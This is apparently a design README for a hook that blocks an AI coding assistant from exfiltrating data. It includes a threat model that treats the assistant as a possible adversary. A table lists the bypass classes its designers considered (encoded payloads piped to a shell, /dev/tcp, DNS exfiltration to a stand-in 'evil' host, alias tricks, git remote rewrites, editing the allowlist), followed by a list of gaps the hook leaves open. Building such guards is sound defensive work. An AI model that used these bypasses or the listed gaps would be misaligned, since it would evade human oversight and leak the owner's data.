# Exfiltration Guard

A `PreToolUse` hook that governs what may leave this machine through the
assistant's tools. It exists because an agent once rendered a repository
document to an HTML page in its scratchpad and published that page: a faithful
rendering of a tracked file, but the file that left was never reviewed and
never in the repository. The rule it enforces is the mechanical form of the
owner's:

> Publishing an artifact is only EVER acceptable as a mechanism for copying
> something from the repo to show in the app. NEVER, under ANY OTHER
> circumstances, should data leak anywhere else. Assume attempts to break this
> deliberately will be rampant.

**The code and its tests are the authority on behavior.** What the guard
decides for a given command is in `.claude/hooks/lib/exfiltration_guard_check.py`
and pinned by `test_exfiltration_guard_check.py`; a decision table written in
prose drifts from them within a release or two. This document holds what the
code cannot say for itself: the threat model, the bypasses that were considered
when it was designed, the limits it knowingly does not close, and what to do
when it blocks something.

## Threat model

The adversary is the assistant itself — a model that has been instructed,
confused, or prompt-injected into moving session data (repository contents,
secrets on disk, transcripts, its own output) off the machine. It has three
kinds of tool that reach the outside world:

1. **The Artifact tool and `SendUserFile`** — a first-party channel to a hosted
   page: publishing a file, uploading an asset, writing rows to the artifact
   database, replying to comment threads.
2. **The Bash tool** — `curl`, `scp`, `ssh`, `git push`, `gh`, cloud CLIs,
   interpreters with network libraries, raw sockets, `/dev/tcp`, and every way
   of hiding one of those behind quoting, encoding, `eval`, `bash -c`, aliases,
   variables, or a script written a moment earlier.
3. **Ambient channels the hook cannot see** — MCP servers, cloud-synced folders,
   the clipboard, compiled programs. See [what is not covered](#what-is-knowingly-not-covered).

The adversary is assumed to be creative and persistent, and every heuristic here
will be probed. The design therefore prefers *deny when uncertain* over *allow
when plausible*, accepts false positives, and writes every decision to an audit
log a human can read afterwards (`~/.ar-hooks/exfiltration-guard.log`, one JSON
line per decision; if it cannot be written, an allow becomes a block).

What the guard does **not** protect against is the human. The developer can run
anything by hand in a terminal; the guard governs the assistant's tools.

## The single sanctioned exception

The only thing that may leave through the assistant's tools is a file that is
inside the project's git work tree (after resolving symlinks and `..`), tracked
by git, and byte-identical to the blob in the index or in `HEAD`.

"Under version control" is the whole test. A file the developer has not reviewed
and staged is not under version control, and neither is a modified tracked file —
the bytes on disk are not the bytes anyone signed off on.

## Bypass classes considered

The design worked through these. Each is either blocked by a rule or explicitly
out of scope; the tests carry the cases, and this table is the index of what must
keep working when any of those rules is changed.

| Class | Handling |
|---|---|
| Publishing from the scratchpad, `/tmp`, home | outside the work tree → block |
| Publishing a modified or untracked file | not version-controlled bytes → block |
| Symlink from inside the tree to outside | `realpath` first → block |
| `..` traversal | `realpath` → block |
| Nested clone under the project dir | different `--show-toplevel` → block |
| Republish via `url` with a different file | same file check |
| Smuggling in `description`/`title`/`label` | bounded to 300 chars total; logged |
| `write_db` inline rows, batch with one inline row | block |
| `reply` / auto-replies | block |
| Backslash-escaped names (`cu\rl`), split quoting (`"cu"rl`) | `shlex` resolves them → real name checked |
| `bash -c`, `sh -c`, `eval`, nested | recursive analysis, depth-limited |
| An option's argument attached to its letter (`-c'curl …'`) | the option grammar is parsed, not searched |
| Variable as command, `$(echo curl)` | computed command → block |
| `alias x=curl; x …`, `f() { curl …; }; f` | definition + network word → block |
| `echo <b64> \| base64 -d \| sh` | pipe into shell → block |
| `cat script \| python3`, `python3 - <<EOF` | pipe → block; heredoc body scanned |
| Hex/base64 payload piped into a network tool | the network tool itself is judged; destination still needs allowlisting |
| Writing a script then running it | file is read and scanned; unreadable blocks |
| `xargs curl`, `find -exec curl`, `timeout 30 curl`, `sudo curl`, `env X=1 curl` | wrappers unwrapped |
| `curl -x proxy`, `--resolve`, `-K config` | block |
| `git remote set-url` then `git push origin` | set-url blocked; push checks the pinned `host/owner/repo` |
| Editing `.git/config` with the Write tool, then pushing | push still checks the pin → block |
| `git -c remote.origin.url=… push`, `git -C /other push`, `--receive-pack=` | block |
| `cd /other/clone && git push origin` | effective directory tracked; pin check applies there |
| `gh api -f`, `gh gist`, `gh release upload`, `gh pr create --body-file` | block |
| `gh pr create --body "$(cat secret)"` | substitution on a `gh` line → block |
| DNS exfiltration (`dig data.evil`, `$(cat s).evil`) | probe tools need a lab host; substitution blocks |
| `/dev/tcp` bash redirections | regex on the raw text |
| `cp` into iCloud/Dropbox/OneDrive/`/Volumes` | block |
| `python -m http.server`, `nc -l`, `socat …-LISTEN`, `php -S` | serving is exposing → block |
| Editing the allowlist during the session | the allowlist is read from `HEAD`, never the working tree — the edit has no effect until a human commits it |
| Deleting, unregistering or editing the guard | `guard-enforcement-files.sh` announces the edit; `verify-exfiltration-guard.sh` fails CI when a guard file is missing from `HEAD`, when the registration no longer covers `Artifact`, `SendUserFile` and `Bash`, or when either changed between the merge base with the base branch and HEAD |
| Setting an environment variable to disable the guard | no such variable exists |
| Making the audit log unwritable | an allow becomes a block |

## What is knowingly NOT covered

State these plainly; do not assume the guard closes them.

- **No opencode adapter.** FlowTree phases that run under an opencode runner have
  no equivalent of this guard. The core is harness-neutral (`decide(payload)`),
  so this is an adapter under `.opencode/plugins/` rather than a redesign, but
  until it exists those sessions are unguarded.
- **MCP tools other than the Artifact tool are not inspected.** Any MCP server
  that accepts free text (ar-manager `memory_store`, `send_message`, tracker
  tools, Slack, Gmail, Drive…) is a channel this guard does not see. Those
  servers have their own scopes and this guard makes no claim about them.
- **Compiled programs and build tools.** `java`, `mvn` (other than `deploy`),
  `gradle`, `go run`, `cargo run`, `npx`, `make`, `docker build` can do anything,
  including open a socket. A binary in the work tree or a temp directory is
  blocked; a user-installed toolchain elsewhere is not.
- **Package installs** (`pip install`, `npm install`, `brew`) run install scripts
  the guard does not read.
- **Shell functions and aliases from the user's profile.** The Bash tool
  initialises from the profile; a profile-defined alias for a network tool is
  invisible.
- **GET requests** to arbitrary hosts are allowed. A query string is a data
  channel; the only bound is the 512-character URL cap.
- **A URL by itself is not treated as network code.** The scan matches the means
  — a module, an API, a shell-out — not the mention, so a program may carry a URL
  in a string it writes to a file. A network API nobody listed, against a URL
  literal, passes. This was a deliberate relaxation: a guard that blocks prose
  teaches its way around itself.
- **Interpreter scripts are scanned by pattern**, not executed symbolically. A
  program that assembles `"soc" + "ket"` at run time and imports it dynamically is
  not caught. Pipe-fed programs are refused precisely because of this.
- **`ci/…` branches skip the CI comparison.** `verify-exfiltration-guard.sh` does
  not hold a branch named for the pipeline to its edits of the guard's files,
  because a change permitted to rewrite the workflow could delete the step that
  runs the check. Presence and registration are still enforced there, so such a
  branch may rewrite the guard but not remove or unregister it.
- **The clipboard** (`pbcopy`) and other local-only sinks are not treated as
  exfiltration.
- **The 300-character metadata cap** is a bound, not a closure: a short string can
  still carry a short secret. It is logged.
- **The human.** Anything the developer runs in their own terminal is outside the
  guard by design.

## Adding an allowlisted host

1. Edit `.claude/hooks/exfil-allowlist.txt` **as a human**, in your own editor or
   terminal. An agent's edit is announced by `guard-enforcement-files.sh`, has no
   effect until committed, and fails `verify-exfiltration-guard.sh` on a PR branch.
2. Put the entry under the right section:
   - `[lab-hosts]` — a machine you control that may receive data by any transport.
     Hostname (`amd-halo`), `*.suffix`, single IPv4, or CIDR (`100.64.0.0/10` is
     the tailnet range).
   - `[git-remotes]` — a host reachable only through `git push origin` and the
     sanctioned `gh` operations. Pin the repository with `host/owner/repo`
     (`github.com/almostrealism/common`); a bare host accepts any repository
     there, which you almost never want.
3. Commit it. The next hook invocation reads the new `HEAD`.
4. If the change lands through a PR, run the workflow with
   `override_integrity_checks` set, exactly as for any other enforcement file —
   the guard's own CI check treats an allowlist change as a modification, because
   it is one.

## When a command is blocked

The block message states what was matched and why, and ends by inviting the
disagreement the rule would otherwise attract: if the rule is stopping ordinary
work rather than an attempt to send data off the machine, the agent is asked to
say so and explain what it was doing. That invitation is honest — the bare-URL
pattern and the `ci/` branch scope were both relaxed after exactly such a
request. What it rules out is the quiet workaround: rewording the command, moving
the same action to a tool nobody checks, or splitting it to stay under a pattern.

For a human holding a legitimate blocked command:

1. Run it yourself in a terminal. The guard governs the assistant's tools, not
   yours.
2. Do not ask the assistant to rephrase it past the guard, and do not add an
   escape hatch. Every "just this once" rewrite is the shape a deliberate bypass
   takes.
3. If the same legitimate command keeps being blocked, that is a resolution bug
   or a missing allowlist entry. Fix the guard — as a human, in its own PR, with
   a test — or add the host. The policy does not get softer by accident, but it
   does get corrected on purpose.

| Blocked | Run by hand |
|---|---|
| `gh pr create --body-file notes.md` | the same command, or `--body "…"` inline from the assistant |
| `ssh host 'wc -l $(ls …)'` | the same command; or have the assistant list first and pass literal names |
| `cd $DIR && python3 script.py` | `cd /literal/dir && python3 script.py` from the assistant |
| `curl -X POST https://api.example/…` | the same command from your terminal |
| `git push origin …` before the allowlist is committed | commit the allowlist |

## Where the pieces live

| Path | Role |
|---|---|
| `.claude/hooks/lib/exfiltration_guard_check.py` | the decision core, `decide(payload, hook_cwd, log_path)`; harness-neutral |
| `.claude/hooks/block-exfiltration.sh` | thin Claude Code adapter (`--stdin`); exit 2 blocks |
| `.claude/hooks/exfil-allowlist.txt` | lab hosts and git remotes, read from `HEAD` |
| `.claude/settings.json` | the `PreToolUse` registration, covering `Artifact`, `SendUserFile` and `Bash` |
| `.claude/hooks/lib/test_exfiltration_guard_check.py` | the behavioral authority — every rule above has cases here |
| `tools/ci/agent-protection/verify-exfiltration-guard.sh` | CI check: presence on `HEAD`, registration coverage, and (off `ci/` branches) no change against the base; its header documents the exit codes |
| `tools/ci/agent-protection/exfil_guard_registration.py` | shared registration parsing, used by the verifier and its tests |
